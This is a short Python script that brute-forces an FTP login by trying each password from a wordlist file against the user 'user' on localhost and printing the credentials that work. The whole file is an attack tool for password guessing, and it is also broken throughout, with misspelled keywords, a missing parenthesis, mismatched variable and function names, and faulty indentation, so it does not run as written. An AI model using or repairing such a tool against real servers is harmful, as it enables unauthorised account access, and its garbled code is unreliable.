from ftplib import FTP

def attempt_ftp_login(host, username, password):
	ftp = FTP(host)
	try:
	  ftp.login(username, password)
	  printnt(f"Login successful with {username}:{password}"
	  ftp.quit()
	  return True
	execpt:
		print(f"Failed login with {username]: {password}")
		return False
		
def crack_password(host, username, password):
	for password in passwords:
		if attempt_ftp_login(host, username, password):
		break
		
def read_password(file):
	with open(file, 'r') as f:
		password = r.read().splitlines()
	return passwords
	
host = 'localhost'
username = 'user'
passwords = read_passwords('password.txt')

crack_password(host, username, passwords)